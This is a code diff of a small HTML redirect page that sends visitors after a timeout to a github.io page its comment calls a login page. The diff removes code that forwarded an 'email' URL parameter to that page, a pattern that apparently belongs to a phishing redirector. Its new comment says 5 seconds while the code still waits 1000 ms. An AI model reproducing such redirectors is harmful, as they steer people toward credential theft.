@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -20,26 +21,10 @@
         }
     </style>
     <script>
-        // Function to get URL parameters
-        function getUrlParameter(name) {
-            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-            var results = regex.exec(location.search);
-            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
-        }
-        
         document.addEventListener("DOMContentLoaded", function () {
-            // Get email parameter if it exists
-            var emailParam = getUrlParameter('email');
-            
-            // Set timeout to redirect after 1 second
+            // Set timeout to redirect after 5 seconds
             setTimeout(function () {
-                // Redirect with email parameter if it exists
-                if (emailParam) {
-                    window.location.href = "https://asethakurgaonst.github.io/spc/index.html?email=" + emailParam;
-                } else {
-                    window.location.href = "https://asethakurgaonst.github.io/spc/index.html";
-                }
+                window.location.href = "https://asethakurgaonst.github.io/spc/index.html"; // Change to your login page URL
             }, 1000);
         });
     </script>
